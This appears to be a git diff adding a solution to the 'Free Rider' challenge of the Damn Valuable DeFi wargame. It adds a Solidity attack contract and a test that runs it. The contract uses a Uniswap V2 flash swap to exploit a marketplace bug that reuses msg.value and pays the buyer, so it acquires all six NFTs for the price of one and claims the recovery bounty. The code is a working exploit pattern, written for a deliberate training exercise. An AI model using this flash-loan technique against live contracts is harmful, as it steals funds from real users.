@@ -11,6 +11,92 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from
+    "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Swapper is IERC721Receiver{
+
+    IUniswapV2Pair pair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableToken token;
+    WETH weth;
+    DamnValuableNFT nft;
+
+
+
+
+    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace,
+    DamnValuableToken _token, WETH _weth, DamnValuableNFT _nft) {
+        pair = _pair;
+        marketplace = _marketplace;
+        token = _token;
+        weth = _weth;
+        nft = _nft;
+    }
+
+    function attack(address recoveryManager, address player) external{
+        uint amount0Out = 15e18;
+        uint amount1Out = 0;
+
+        bytes memory data = abi.encode(amount0Out);
+        bytes memory argData = abi.encode(address(player));
+
+        pair.swap(amount0Out, amount1Out, address(this), data);
+        
+         for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this),address(recoveryManager), i,argData);
+        }
+
+        payable(address(player)).transfer(address(this).balance);
+        
+    }
+
+
+    function uniswapV2Call(
+        address sender,
+        uint amount0,
+        uint amount1,
+        bytes calldata data
+    ) external {
+        require(IUniswapV2Pair(msg.sender) == pair, "not pair");
+        require(sender == address(this), "not initiated by us");
+
+       uint256[] memory tokenIds = new uint256[](6);
+
+       for (uint256 i = 0; i < tokenIds.length; i ++){
+            tokenIds[i] = i;
+        }
+
+        address payable wethAddr = payable(IUniswapV2Pair(pair).token0());
+        WETH(wethAddr).withdraw(amount0);
+
+        uint256 amountToRepay = (amount0 * 1000) / 997 + 1;
+
+        marketplace.buyMany{value : 15 ether}(tokenIds);
+
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(pair), amountToRepay);
+
+       
+    }
+
+    function onERC721Received(
+    address,
+    address,
+    uint256,
+    bytes calldata
+)
+    external
+    pure
+    override
+    returns (bytes4)
+{
+    return IERC721Receiver.onERC721Received.selector;
+}
+
+    receive() external payable {}
+    fallback() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -107,7 +193,7 @@ contract FreeRiderChallenge is Test {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(uniswapPair.token0(), address(weth));
         assertEq(uniswapPair.token1(), address(token));
-        assertGt(uniswapPair.balanceOf(deployer), 0);
+        assertGt(uniswapPair.balanceOf(deployer), 0); 
         assertEq(nft.owner(), address(0));
         assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
         // Ensure deployer owns all minted NFTs.
@@ -123,7 +209,12 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Swapper swapper = new Swapper(IUniswapV2Pair(uniswapPair), 
+        FreeRiderNFTMarketplace(marketplace), DamnValuableToken(token),
+        WETH(weth),DamnValuableNFT(nft));
+        payable(address(swapper)).transfer(PLAYER_INITIAL_ETH_BALANCE);
+        swapper.attack(address(recoveryManager), address(player));
+
     }
 
     /**
